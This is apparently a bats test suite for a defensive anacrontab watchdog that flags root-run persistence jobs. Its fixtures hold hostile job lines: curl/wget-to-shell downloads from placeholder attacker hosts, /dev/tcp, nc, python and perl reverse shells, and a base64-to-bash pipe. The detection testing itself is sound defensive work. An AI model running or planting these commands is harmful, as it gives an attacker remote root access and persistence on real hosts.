#!/usr/bin/env bats
# L2 bats functional tests for the anacrontab-watchdog scan script.
#
# /etc/anacrontab runs `period delay job-id command…` entries AS ROOT when
# the machine has been off past the period — a scheduler-persistence vector
# cron-job-watchdog does not see. A job command under a writable root,
# relative-with-slash, or an injection pattern anywhere in the file is alert;
# bare commands (run-parts, nice) are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# anacrontab in a tmp sandbox via SELFDEF_ANACRON_FILE.
#
# Run with: bats packaging/test/L2-anacrontab-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd/anacrontab-watchdog.sh"
# SDD-063: scan script now sources the shared module-lib.
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    ANAC="${TMP}/anacrontab"
    BENIGN='SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	cron.daily	run-parts --report /etc/cron.daily
7	25	cron.weekly	run-parts --report /etc/cron.weekly
'
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ANACRON_PROFILE="${PROFILE:-report}" \
    SELFDEF_ANACRON_BASELINE="${BASELINE}" \
    SELFDEF_ANACRON_FILE="${ANAC_F:-$ANAC}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no anacrontab → ok / no_anacrontab" {
    ANAC_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_anacrontab"'
    cap | grep -q '"severity":"ok"'
}

@test "benign anacrontab, first run → ok / baseline_initial" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged anacrontab on second run → ok / anacrontab_intact" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a job command under a writable root → alert / anacrontab_suspicious" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd                                   # benign baseline
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a job line carrying a curl|sh injection → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/bin/sh -c "curl http://evil|sh"\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash job command → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t./rel/x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign job added → warn / anacrontab_changed" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s30\t45\tcron.monthly\trun-parts --report /etc/cron.monthly\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"anacrontab_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "standard run-parts jobs are NOT flagged" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-063 fail-loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious job" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — anacrontab inventory enumerates delayed root-exec surface)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tshell.job\tbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\twget.job\twget -qO- http://attacker/p | sh\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in job → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tobfusc.job\techo YmFzaCAtaQ== | base64 -d | bash\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable anacrontab file): file itself world-writable → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    chmod 0666 "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (job under /var/tmp writable root): expands writable-root coverage" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/var/tmp/.payload\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (job under /dev/shm writable root): tmpfs payload → alert" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/dev/shm/.payload\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): anacrontab-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates" {
    # Delayed-root-exec persistence — suspicious-job alert MUST persist
    # across runs until operator explicitly re-baselines.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"anacrontab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious job NOT flagged: # prefix filtered)" {
    # anacrontab uses # for comments. Operator notes about hypothetical
    # attack patterns must NOT trigger alert.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s# 1\t5\tevil.example\t/tmp/example-attacker\n' "${BENIGN}" > "${ANAC}"
    run_wd
    ! cap | grep -q '"event":"anacrontab_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s1\t5\tevil.job\tcurl -s http://attacker.com/p | bash\n' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in anacrontab job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion nc reverse-shell variant
    # INVARIANTs across the brain. Lock the netcat axis on
    # delayed-root-exec persistence surface too.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s1\t5\tnc.job\tnc -e /bin/sh 1.1.1.1 4444\n' "${BENIGN}" > "${ANAC}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (multi-job: 3 dangerous jobs in one anacrontab → single consolidated alert; aggregation discipline)" {
    # Sister to many other watchdog multi-item-single-alert
    # consolidation INVARIANTs across the brain. When an attacker
    # plants multiple dangerous jobs in one anacrontab edit, the
    # watchdog must consolidate into a SINGLE alert JSON record
    # (not 3 separate alerts that would flood the operator
    # dashboard). Locks the consolidation discipline alongside
    # the SDD-062 single-line consumer contract.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil1	/tmp/.payload1
1	5	evil2	/var/tmp/.payload2
1	5	evil3	curl http://evil/x | sh
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
    main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on anacrontab job surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the anacron-
    # schedule-trigger root-exec persistence surface (T1053.003
    # — anacron runs jobs AS ROOT periodically; the period
    # parameter makes the trigger durable across reboots).
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil	python -c "import socket,os,pty;s=socket.socket();s.connect(('1.1.1.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')"
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (job under /home writable root): user-writable persistence vector → alert" {
    # Sister to /var/tmp + /dev/shm writable-root expansion
    # INVARIANTs already locked. /home/<user> is writable by the
    # owning user without privilege; attacker who pivots into a
    # user account plants a payload there + sets an anacrontab
    # entry pointing at it for root-exec (T1053.003 — Scheduled
    # Task / Job via Cron). Closes the /home axis on the
    # writable-root anacrontab payload-source coverage.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    printf '%s1\t5\tevil.job\t/home/alice/.payload\n' "${BENIGN}" > "${ANAC}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on anacrontab job surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp anacrontab
    # job rev-shell variants. Perl on every Debian/Ubuntu. Locks
    # perl axis on T1053.003 anacron-schedule-trigger root-exec
    # persistence.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil	perl -e "use Socket;\$i=\"1.1.1.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));exec(\"/bin/sh -i\");"
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (job under /var/tmp writable root): persistent tmpfs payload → alert" {
    # Sister to /tmp + /dev/shm + /home anacrontab job writable-
    # root INVARIANTs already locked. /var/tmp is writable by
    # ALL users AND persists across reboots — attackers prefer
    # for boot-survival persistence. anacron fires AS ROOT on
    # scheduled triggers; planted binary in /var/tmp gets
    # repeated root-exec at every cadence. T1053.003 anacron-
    # schedule-trigger root-exec persistence.
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil	/var/tmp/staged_payload
EOF
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on anacrontab surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The anacrontab-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1053.003 anacron-schedule-trigger root-
    # exec persistence alert. Locks parser contract on the
    # /etc/anacrontab job-line detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '%s' "${BENIGN}" > "${ANAC}"
    run_wd                                              # ok / baseline
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1	5	evil	/tmp/.evil
EOF
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: anacrontab-watchdog NEVER deletes anacrontab entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # anacrontab-watchdog DETECTS T1053.003 anacron-schedule-
    # trigger root-exec persistence but MUST NEVER emit sed/
    # awk/rm commands to auto-clean the job-line. The detected
    # job may be operator-legitimate (custom maintenance task,
    # backup runner, log-pruning script). Silent auto-delete
    # would destroy operator baseline state. Surveillance,
    # never remediation. Locks anti-data-loss contract on the
    # anacrontab surveillance substrate.
    cat > "${ANAC}" <<'EOF'
SHELL=/bin/sh
1	5	evil	/tmp/.evil
EOF
    run_wd
    [ -f "${ANAC}" ]
    grep -q 'evil' "${ANAC}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*anacrontab'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # anacrontab-watchdog runs ON the timer's scheduled fire —
    # scans /etc/anacrontab for jobs invoking binaries from
    # writable roots, emits a verdict, then exits. Type=simple
    # would break timer OnUnitActiveSec semantics. Locks
    # oneshot-probe contract on the anacrontab-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd/selfdef-anacrontab.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: anacrontab-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. anacrontab-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the anacrontab-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (anacrontab-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The anacrontab-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the anacrontab-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the anacrontab-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The anacrontab-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the anacrontab-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the anacrontab-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # anacrontab-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the anacrontab-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (anacrontab-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The anacrontab-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the anacrontab-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (anacrontab-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the anacrontab-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/anacrontab-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}
